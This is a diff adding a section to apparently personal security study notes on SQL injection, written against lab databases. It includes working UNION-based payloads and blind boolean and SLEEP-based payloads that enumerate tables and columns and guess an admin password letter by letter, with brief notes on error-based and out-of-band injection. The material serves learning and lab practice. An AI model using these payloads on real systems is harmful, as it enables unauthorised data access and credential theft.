@@ -458,3 +458,55 @@ Applications will employ numerous techniques in filtering and sanitising data th
 
 When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.
 ```
+
+## SQL Injection
+
+Example query
+
+```
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+```
+
+```
+Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.
+```
+
+Example steps:
+
+```
+admin123' UNION SELECT 1,2,3;-- 
+
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+admin123' UNION SELECT 1,2,3 from users where username like 'a%
+
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+# Sleep instead of boolean
+
+referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+```
+
+### In-Brand SQLi
+
+* Intant feedback on the page from doing an SQLi
+
+### Error SQLi
+
+* Discovering things by triggering errors to occure
+
+```
+The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " )
+```
+
+### UNION SQLi
+
+* Get large amounts of data by using a ***UNIONS*** & ***SELECT***
+
+
+
